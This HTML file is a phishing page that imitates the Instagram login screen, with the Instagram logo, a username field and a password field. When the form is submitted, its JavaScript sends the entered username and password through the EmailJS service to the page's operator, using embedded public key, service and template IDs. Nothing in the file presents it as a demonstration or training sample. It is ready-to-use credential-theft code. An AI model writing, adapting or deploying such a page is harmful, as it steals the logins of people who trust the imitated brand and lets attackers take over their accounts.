<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3.2.0/dist/email.min.js"></script>
    <script>
        (function(){
            emailjs.init("rwfH3239AKzsJ46ug"); // Replace with your actual public key
        })();

        function handleSubmit(event) {
            event.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            emailjs.send("service_3q3tyxa", "template_vajrdy4", {
                username: username,
                password: password
            })
            .then(() => {
                alert("Email sent successfully!");
            })
            .catch((error) => {
                alert("Error sending email: " + error.text);
            });
        }
    </script>
    <link rel="stylesheet" href="styles.css"> <!-- Link to your CSS file -->
</head>
<body>
    <div class="container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram" class="logo">
        <h2>Login</h2>
        <form onsubmit="handleSubmit(event)">
            <input type="text" id="username" name="username" placeholder="Username" required>
            <input type="password" id="password" name="password" placeholder="Password" required>
            <input type="submit" value="Log In">
        </form>
    </div>
</body>
</html>
